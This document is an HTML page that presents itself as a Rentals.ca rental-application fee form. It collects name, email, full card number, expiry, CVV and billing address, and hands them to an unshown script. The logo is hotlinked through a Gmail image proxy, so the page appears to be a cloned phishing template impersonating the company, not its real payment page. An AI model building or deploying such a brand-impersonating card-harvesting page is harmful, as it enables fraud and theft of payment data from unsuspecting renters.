<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Application Fee Payment</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://ci3.googleusercontent.com/meips/ADKq_NZ0YECgIQF9DsaU855sEGJSp4uAyoTPKbgVIv_4AWiHN3t0gWzLC0dxiKO5vwULjZ63VfTfJdmixUSTq2ox_Vd-XD23GEeIEvAb1xTBPraPuEFgyK-9absGXN5d=s0-d-e1-ft#https://rentals.ca/static/rentalsca-phoenix/img/emails/logo-header.png" alt="Logo">
        </div>
        <div class="content">
            <h1>Complete Your Rental Application</h1>
            <p>Please fill out the form below to submit your application. A one-time fee of <strong>$25.00</strong> will be charged to your credit card.</p>
            <form id="applicationForm">
                <label for="name">Full Name:</label>
                <input type="text" id="name" name="name" required>

                <label for="email">Email:</label>
                <input type="email" id="email" name="email" required>

                <label for="creditCard">Credit Card Number:</label>
                <input type="text" id="creditCard" name="creditCard" required>

                <label for="expDate">Expiration Date:</label>
                <input type="text" id="expDate" name="expDate" placeholder="MM/YY" required>

                <label for="cvv">CVV:</label>
                <input type="text" id="cvv" name="cvv" required>

                <label for="billingAddress">Billing Address:</label>
                <input type="text" id="billingAddress" name="billingAddress" required>

                <button type="submit" class="button">Submit Payment</button>
            </form>
        </div>
        <div class="footer">
            <p>&copy; 2024 Rentals.ca, Inc. All rights reserved.<br>Trademarks are property of their respective owners.</p>
        </div>
    </div>
    <script src="app.js"></script>
</body>
</html>
